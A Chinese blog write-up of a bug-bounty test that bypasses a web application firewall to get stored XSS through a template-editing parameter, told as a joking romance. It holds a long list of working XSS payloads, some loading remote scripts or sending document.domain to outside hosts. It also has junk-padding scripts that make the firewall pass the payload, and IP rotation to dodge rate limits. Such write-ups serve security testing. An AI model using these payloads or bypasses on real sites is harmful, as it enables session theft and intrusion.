缘起XSS之与某WAF的恩爱情仇
================

0x0 前言
------

在现在waf遍地的时代，在挖掘SRC的时候XSS类型的漏洞不免都得绕一番。不得不感叹，近几年的waf发展是越来越快了，绕过的难度提升不少。因为是第一次采用不太常规的方式来实现完美绕过某Web应用防火墙(WAF)，觉得很有意思，故打算分享下自己的思路。

0x1 漏洞点
-------

​ 在测试某SRC网站一些功能的时候，我注意到了一些设置前端模板的功能点，比如在APP显示页面的设置、H5页面的设置等等，这些点测XSS真的屡试不爽。

点击保存的时候，我用burp抓包，发现其中有个参数`editTpl`,而这个参数的内容更是直接断定了我的猜测，这里通过urldecode，可以知道它传进去的其实就是HTML页面源代码。

![image-20210702214125160](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d81b46af6ddb40e62d6f78e1ae8063b28c1922db.png)

一般这种情况做的比较安全一点的是，基于白名单对富文本过滤，但是很显然，作为一名灵魂开发工程师一般都是选择最简单的方式:直接传入-&gt;直接解析-&gt;直接就是漏洞，平平无奇，提交完事。

但是事情真的会那么一帆风顺吗？

0x2 她不爱我
--------

​ 首先第一步，进一步确认下是否支持解析HTML标签，我会在原内容的基础上会添加一个

```php
<img/src=x>
```

一般waf都不会拦截这个的，好家伙，直接给我弹回来waf拦截。

![image-20210702224628703](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-182cb0e387fe68c5c3a835bf6fafc008a88ec244.png)

？？？？？ 当时我的脑子就是瓦特了，神马waf，这智商有点低下呀，说实话，就是这一点，让我忍不住来分享我与傻waf的斗智斗勇过程。

我简单看下原先的参数内容，发现里面是有`<img>`标签的,难道说是要这样?

```php
<img%20src='http://qq.com/'>
```

无情拦截，我再观察了下原先的参数内容，难道是要这样?

```php
<div><img%20src='http://qq.com/'></div>
```

![image-20210702215732991](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ecd7f429d388ec92405afaebea07f61674a81d61.png)

卧槽，这个waf太厉害了吧！

这里还原下我当时的想法的，美女WAF，你怕不会是基于语义，然后自定义规则来拦截的吧，看本宝宝如何将你拿下。

0x3 漫漫求爱之路
----------

追忆篇:

> 想起去年偶遇长亭waf雷某，其强大的语义分析和强大的机器学习能力，属实让我吃了不少苦，不过当年稚嫩的我还是花了几分钟来Bypass，结合一些特定场景赢得了其芳心，但是总感觉胜之不武，速度太快，略有遗憾，最后因XSS又不能RCE，只能挥泪告别，没能继续做深入交流。
> 
> 但如今的我，已经没有RCE的包袱了，却再也没有机会遇见某雷，重续前缘。可我万万没想到，在某酒吧溜达寻找目标的时候，某网站应用防火墙向我款款走来！

### 0x3.1 厚脸皮

作为一名老实人，fuzz手段是极其朴素的。

```php
<div><img%20src='http://qq.com/'%20onerror></div>
```

直接拦截，正常来说我的套路是:

```php
<div><img%20src='http://qq.com/'%20onerror></div>
<div><img%20src='http://qq.com/'%20onerror=></div>
<div><img%20src='http://qq.com/'%20onerror=x></div>
```

有onerror直接拦截，高冷型，这个时候，我的法拉利钥匙不经意掉了下来。

```php
<div><img%20src='http://qq.com/'%20onLoad></div>
```

这下子，不拦截了，那么我继续试试邀请她上车。

```php
<div><img%20src='http://qq.com/'%20onLoad=></div> <!--多加了一个=号，用来测试他的拦截规则-->
```

也许是她看见了车上不起眼的杜蕾x，直接给了我一巴掌，然后愤愤地推开了我。

难道我要再一次错过这段天赐良缘，可我内心是极其不甘心的，我拉着某防火墙的小手，掏出了我的各种财富证明，例如:

```php
<div><img%20src='http://qq.com/'%20onLoad1=></div> 
```

这个并没有拦截，说明了女神应该对某些特定Event应该是情有独钟(比如法拉利，兰博基尼之类的)。

那么是时候带女神进车库转转？ 尝试各种Event事件？看看有哪些是女神看不上，但可能也是价格不菲的，来给女神一个意外的惊喜？

通常来说，我不会这样去做，因为从waf开发的角度来说，一般常用事件都会加入规则中，不常用的也是很鸡肋的，除非要找点特殊的特性来完美Bypass，这个成本的话稍微有点高，为了追个女孩子，不到万不得已，一般不会这样去做。

接下来，我做的是，先测试下女神的底线(即waf的基本逻辑):

```php
editTpl=<x%20onerror> #不拦截
editTpl=<x{fuzz}onerror=> #不拦截 fuzz内容为非换行、空格之类的字符
editTpl=<x%20onerror=> #拦截
editTpl=<x%0d%FFonerror=> #拦截
editTpl=<x/onerror=x>  #拦截
editTpl=<x/onLoad=x> #拦截
editTpl=<x/o nkeyup=x> #拦截，尝试一些偏移的事件
editTpl=<x/onLoad=x #拦截，想通过语义来绕过
editTpl=x/onLoad=x #拦截，这个都拦截，看来patch了很多绕过方式。
editTpl=x%20onLoad=x #拦截
editTpl=<script #拦截
editTpl=<script> #拦截
editTpl=<script> #拦截，什么大小写都是浮云
editTpl=<\script> #不拦截，允许闭合，好像没啥用？看来还是有一定自定义的规则的。
editTpl=<\script> #不拦截，直接回显原内容
editTpl=<x >#onLoad=> #拦截
editTpl=<iframe> #不拦截
editTpl=<iframe/src=x> #拦截
editTpl=<div><iframe%20src='http://qq.com'></div> #拦截
editTpl=<iframe/srcdoc=x> #拦截
editTpl=<a/href=x>123</a> #不拦截
editTpl=<a/href='javascript:'>123</a># 拦截，实体化编码也会解码进行拦截，鸡肋的一种
```

说实话，测试几个payload下来，这个waf的拦截规则可以说是很严格的了，已经会对业务造成一定影响了，但是这样的话安全性确实也提高了，可以简单分析得知，它的拦截机制是属于那种比较智能的，而不是传统那种死规则，对一些有花里胡哨的标签比如`<script>`，直接不分析语义，匹配到就直接拦截，导致了很多骚操作没办法进行，对on事件定义的规则虽然我没测试，但是我觉得开发waf的人应该比我找到的事件会全，其定义的处理规则也很暴力，字符+换行空格等合法匹配+on事件，就会拦截，类似做了一种特征，出现就ban，就是没给你一点希望那种，规则对通用XSS语法限制得很死。

我望着眼前秀色可餐的某SEC小脸蛋，留下了菜B的泪水，难道、难道我就要这样就放弃了吗，可我不甘心呀，肯定还有什么办法的，一定还会有什么办法的。

突然，脑子开窍，我想到了群里面的老哥，老哥们一定会帮助我的，我眼角洋溢着泪水激动地找到了老哥，谁知道老哥直接跟我说，"这种waf直接怼RCE就行了，这年头谁还来绕waf，直接日waf简单省事!",此时的我，默默退出了群聊，我知道我跟老哥们的差距又拉大了。

### 0x3.2 拜师学艺

我擦干了眼角的泪水，内心默默鼓励自己，自己约的妹子，含着泪也要到手。

回去翻翻自己的**学习资料.avi**,发现有个图片

![image-20210703004217909](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-09e580dc7ec00d62eef876409190deedae621c55.png)

感觉还挺不错的，按照图示结构，构造了如下非常多的payload，全都拦截。

```php
editTpl=<a/x="javascript:">123</a>
editTpl=<a/x1="javascript:">123</a>
editTpl=<a/x1=1"javascript:">123</a>
editTpl=<a/href="java\x09script:">123</a>
...
```

核心就是拦截`javascript:`这个组合，其中\[5\]这个位置，我尝试了`\x09`、`\x0a`、`\x0d`,都不行。

哎，我又跑去看了网上一些经典的Bypass文章，结果发现很多pua套路就是简单语义Bypass、新标签Bypass，新事件Bypass，但是这个waf就很狗，对关键词是硬匹配的，感觉加了很多人工修正的规则在里面，看来，这个WAF，在测试阶段应该是被投食了不少payload。

### 0x3.3 霸王硬上弓

算了，2021年了，方法总比困难多。

掏出2021最新的XSS Cheat Sheet:

<https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>

![image-20210703010424081](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8e2f352eea9e1d3ffde5be1ce2456bfe088fc7e6.png)

要啥有啥，自己组合，这里废话不多说，选择第三个全量Fuzz，9000来条payload，开50并发跑。

![image-20210703010542963](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f96e9783c1a84262dc857a33811aefad083632d.png)

大概跑了1k多条还没有结果，然后卡住了，被waf拦截了，看来是WAF没打算给Burp面子，直接限制了请求频率，这不能忍，我果断挂上腾讯云函数的IP不断切换代理，自家兄弟打自家兄弟，确实说不过去，这次就跑起来稳定多了，

![image-20210703011323409](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-036c8e4b4f4bf79348ffe6ef5322a829547d9b40.png)

oh，终于跑完了，纳尼？只有这几个，其他全都被拦截了？ woc？？？？

经过我对payload的一番查看，发现很多payload都带了`a lert(1)`,这个特征过于明显，会不会是这个原因呢？我重新修改了下payload，加了个替换处理。

![image-20210703011724380](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8d5c7e752f243d114079557358d1ac9e889e9c26.png)

然后又开始了漫长的等待ing...

![image-20210703012255228](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2eb8548847cb520a44c9f64f38c2c946b4d1151e.png)

oh，感觉还不错，出来了一类，似乎这个payload可行，看来是利用一个新事件`ontransitio nstart`。

不过很遗憾，我直接复制这个payload到页面，并不会直接触发事件，鸡肋的，在页面尝试了各种常规操作也不会触发，更加鸡肋，导致我都不愿意去查这个事件该如何触发，正当我一筹莫展的时候，女神(WAF)对我笑了笑说，就这？你就这点本事？

0x4 屌丝的反击
---------

望着女神(WAF)轻蔑的眼神，我的拳头攥得更紧了，难道我的屌丝身份要暴露了？

都说世间最廉价的是，是一无所有的赤诚和一事无成的温柔。

在女神面前，我是多么努力，可惜，在结果导向的世界里，只有好的结果才能被人认可，才能慰藉你的所有努力，要不然，一切都无济于事。

恍惚间，微风拂过，想起某海王对我说过的一句话，"不要怂，干就完事！"

我颤巍巍地打开了珍藏已久的云集各路大神的Xss Payload List, 希望能够扳回一城。

```php
%u003Csvg onLoad=a lert(1)>
%u3008svg onLoad=a lert(2)> 
%uFF1Csvg onLoad=a lert(3)>
<Img Src=//X55.is onLoad=import(src)>
<svg/onLoad=location/**/='https://your.server/'+document.domain>
<iframe/onLoad=aaajavascipt:a lert(1)>
%2sscript%2ua lert()%2s/script%2u
<style>
 x{}</style><xss style="animation-name:x" onanimationend="a lert(1)"></xss>
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
<INPUT/onfocus=a lert&#x00000000028;1&#x00000000029; autofocus>
<svg onLoad=p rompt%26%230000000040document.domain)>
<svg onLoad=p rompt%26%23x000000028;document.domain)>
<svg onLoad=a lert%26%230000000040"1")>
<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='a lert(1)'>"></style></h1>
<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!
<svg onLoad='new Function`["_Y000!_"].find(al\u0065rt)`'>
<?tag x="-->" test="<img src=x onerror=a lert(1)//">
<x/o nmouSeenter=window[`\x61\x6c\x65\x72\x74`]`1337`
<object/data=javascript:a lert()>
<a/href="javascript%0A%0D:a lert()">
<embed/src=//㎤.㋏>
<svg/onLoad=throw/**/Uncaught=window.onerror=eval,&quot;;a lert\501\51&quot;>
<dialog open onclose=a lert(1)><form method=dialog><button>XSS</button></form>
<svg><animatetransform onbegin=alert(1) attributeName=transform>
<svg/onLoad=throw/**/onerror=alert,1>
"><video><source onerror=e val(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
<image src=validimage.png onLoadend=a lert(1)>
<A%09onmOuSeoVER%0a=%0aa=a lert,a(document.domain)>xss
<x v-html=_c.constructor('a lert(1)')()>
<xss onbeforescriptexecute=a lert(1)><script>1</script>
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=a lert(1)>
<svg><script href=data:,a lert(1) />
<xss onafterscriptexecute=a lert(1)><script>1</script>
<Brute Data-Spy=scroll 
Data-Target='<Svg onLoad=(confirm)(1)>'>
<brute contenteditable 
autofocus onfocus=a lert(1)>
<style/><img src="z'z</style><script/z>a lert(1)</script>">
<svg onLoad="a lert(1)" <="" svg=""
<a autofocus onfocus=a lert(23) href=#>x</a>
<svg/onLoad="`${p rompt``}`">
tarun"><x/onafterscriptexecute=confirm%26lpar;)//
"><!'/*"*\'/*\"/*--></script><Image SrcSet=K */; onerror=confirm(document.domain) //># 
<d etails/open/o ntoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
<math><x xl ink:href=javascript:confirm`1`>click
<iframe srcdoc=<svg/o&#x6Eload&equals;a lert&lpar;1)&gt;>
<iframe/onLoad='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
<svg<0x0c>onLoad=a lert(1)><svg>
'><d etails/open/o ntoggle=confirm(document.location)>
<imsofake onpointerrawupdate=a lert(1)>test
<div onpointerrawupdate=a lert(1) style=width:100%;height:100%;position:absolute;background-color:red>test
<</p>iframe src=javascript:a lert()//
<script>
x = '<!--<script>'/*</script>-->*/;a lert(1)
</script
<svg onLoad="import('data:text/javascript,al'+''+'ert(0)')">
<image src\r\n=valid.jpg onLoadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
<a href=&#01javascript:a lert(1)>
<a href=javascript&colon;confirm(1)>
<a href="jav%0Dascript&colon;a lert(1)">
<img src=something onauxclick="new Function `al\ert\`xss\``">
<svg id=javascript:a lert(10) onLoad=location=id>
<svg/onLoad=%26nbsp;a lert`bohdan`+
1'"><img/src/onerror=.1|a lert``>
<img src onerror=%26emsp;p rompt`${document.domain}`>
<img src="img-src" onLoadstart="a lert(45)">
<img src="img-src" onLoadend="a lert(45)">
<d etails onauxclick=confirm`xss`></d etails>
<f rameset o npageshow=a lert(1)>
<svg o nunload=http://window.open('javascript:a lert(1)')>
<d etails/open o ntoggle=a lert(1)>
<xss class=progress-bar-animated onanimatio nstart=a lert(1)>
<xss<script>>&28;p rompt();&28;<</script>/xss>
<svg><b><style><img id="&lt;/style&gt;&lt;img src=1 onerror=a lert(1)&gt;">
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;a lert`1`;>
<svg%0Aonauxclick=0;[1].some(confirm)//
<</div>script</div>>a lert()<</div>/script</div>>
<bleh/o nclick=top[/al/.source+/ert/.source]&Tab;``>click
<body ontouchstart=a lert(45)> 
<body ontouchend=a lert(45)>   
<body ontouchmove=a lert(45)>
"><input/onauxclick="[1].map(p rompt)">
<d3"<"/o nclick="1>[confirm``]"<">z
<d etails%0aopen%0ao ntoggle%0a=%0aa=p rompt,a() x>
<meter value=2 min=0 max=10 o nmOuSeoVER=a lert(1)>2 out of 10</meter><br>
<o bject/onerror=write`1`//
<output name="javascript://&NewLine;\u0061ler&#116(1)" o nclick="e val(name)">X</output>
<svg><script>a lert(1)<b>test</b>
<!--><script src=//example.com/abc.js></script>-->
<img ="=" title="><img src=1 onerror=a lert(1)>"
<!--*/!'*/!>%0D<svg/onLoad=confirm`1`//--
<math><annotation-xml encoding="text/html"><xmp>&lt;/xmp&gt;&lt;img src=x onerror=a lert(1)&gt;</xmp>
<l ink rel='preload' href='#' as='script' onLoad='confirm(domain)'>
<l ink rel=import href=https://bo0om.ru/bin.bin>
<math><annotation-xml encoding=text/html><script></</script/>a<!>l<?>ert&lpar;</>1&rpar;</></script>
<script>location.href;'javascript:a lert(1)'</script>
<svg>
<a xml:b ase="javascript:a lert(1)//" href="#"><circle r="100" />
</svg>
<math xml:b ase="javascript:a lert(1)//">
    <mrow href="#">qwe</mrow>
</math>
'>--><script/src=//go.bmoine.fr/xss>
<% style=behavior:url(: onreadystatechange=a lert(1)>
<script src="/ゝhttp://html5sec.org/test.js "></script>
```

很遗憾上面的所有payload，我都手工进行了测试，并且尝试组合改进一些语句结构。

不过还是全部被拦截了，此时女神WAF的笑声越来越大，似乎在嘲笑我的无能与弱小。

可是我已经打掉了所有底牌了，此时此刻的我，感觉已经被女神(WAF)拿捏住了，在女神(WAF)面前，我的骚操作跟小丑表演没啥区别。

难道屌丝就不能反击吗？ 难道咸鱼只能是咸味的吗？ 我不断地叩问自己的灵魂深处，希望能寻找到一些答案，然而结果是一片无声的死寂，我痴痴地望着唾手可得的女神(WAF)，所谓什么近水楼台都是狗屁，我终归不是她的命中人，此生就此结束吧，活着已经没有任何意义了，我扬起嘴角对女神笑了笑，转头一股脑撞向迎面而来的神秘卡车，顿时，鲜血直流，在意识模糊之际，我竟然看到了老哥带着0day飞奔而来，直接RCE将女神WAF给收服了，看着我，遗憾地说了句："终究是来晚了吗，菜是原罪呀，好弟弟，如果有来世，一定要好好学习！"，刹那间，我的眼角不争气地留下了泪水，终于要告别这个世界了吗，一切都结束了吧!

0x5 重生之开挂人生
-----------

当我以为一切都尘埃落地，所有的故事已成定局的时候，我却再次睁开了眼，咦，这里是哪里？

此时，一个声音好好听的小姐姐，向我娓娓道来，"欢迎来到超级AI智能化虚拟世界，作为我们的第10000000001编号的新成员，你可以向超级AI提出一个任意要求，都会满足你的哦！"

我抬头看了看，眼前那傻不拉几且呆头呆脑的AI机器人，就这？ 算了，姑且一试吧，提什么要求好呢？

看着眼前琳琅满目的小姐姐，只有小孩子才会选择，大人我全都要，我擦了擦嘴角的口水，向超级AI迫不及待地询问道："能不能告诉我某网站应用防火墙的绕过技巧？"

此时超级AI面容失色，显然没意料到我会提出这个问题，不过很快，超级AI调整了状态，严肃地回答我说:"一生二、二生三、三生万物，所有的东西必然有其软肋，要找到其核心痛点，再狠狠击破。"

听完超级AI的话，我若有所思，WAF的痛点，应该就是精确区分正常业务数据和攻击向量，还有就是不能干扰到业务的正常进行，首先作区分，就要对数据进行解析，然后再分析，如果我在这个环节，通过传入巨量的数据，造成WAF解析超时，那么WAF为了不影响正常业务，是不是会对数据进行放行呢？ 放行之后，如果后端也没对传入的数据做限制，然后传入的数据也满足应用的内存资源，那么一切就变得简单了。

不管三七二十一,写个简单的脚本填充数据。

```php
#!/usr/bin/python
# -*- coding:utf-8 -*-
from random import randint
with open('tempStr.txt','a+') as f:
    f.write(chr(randint(0,255))*1000000)
f.close()
```

![image-20210703115731401](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-15479c3049343f524788c4ad9890b531fc48d0fe.png)

小小等待几秒后端去处理，好家伙，你咋不继续拦截了呢？ 难道事情就这么简单？急忙回去看页面。

![image-20210703120759065](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-977562afce4d3c01e227696f3c85d799fcd5ab65.png)

![image-20210703120820057](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-03271baed51caf5eae85e642678ce38673cd8341.png)

？？？我的`<script>`呢？这个时候我再试试

![image-20210703120028525](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4af9b9f672c448bb3f220007591a527e9782d62e.png)

???，也没了，照样没有了，我当时就在想，是不是waf只保留了后面一部分内容？

我又将payload添加到了后面，一样没有返回? 那么有可能是随便取的内容呗，最后我急了，直接写了个脚本，

```python3
#!/usr/bin/python
# -*- coding:utf-8 -*-
from random import randint
with open('tempStr.txt','a+') as f:
    # f.write(chr(randint(0,255))*1000000)
    f.write("<img/src=x/onerror=a lert(1)"*1000000)
f.close()
```

好家伙，你猜怎么着？ 页面直接返回空内容了，最后，根据单身二十来年的经验，我尝试如下操作。

![image-20210703120628672](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8f11604c3cf4d100a760ca76541277f51f757c94.png)

![image-20210703120718467](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4219087f17d61eb785354c554a48949cc7a77f86.png)

看着熟悉的弹框，我的内心瞬间满足了。

0x6 全剧终
-------

关于具体利用的话，可以这样构造:

```python3
with open('tempXSS.txt','w') as f:
    f.write('<img src="x" oner<script>ror=a lert(document.domain)>'*1)
    f.write("<!--<input>-->"*100000)
f.close()
```

通过注释多出来的内容，然后那个值的大小可以根据自己需要调小一点。

其实这个问题，应该是WAF在设计之初，对这种垃圾数据填充应该是做了一种衡量的，去尝试Remove掉一些可疑的字符串，然后因为多了一步，在进行测试的时候，测试人员就没有对此进行一些Bypass的尝试，导致了这次的绕过。

0x7 篇外
------

​ 这个防火墙的SQL注入拦截也算蛮有意思的，不过我的绕过比较常规我就没写了，结合本文应该也能发现一些奇奇怪怪的绕过方式，还有就是GET能不能利用这种方式，2048个字符限制呢？ 这个我只能说你不去尝试一下，你怎么知道自己不可以呢？ 思路灵活就好了，思维**发散**,宝马变单车!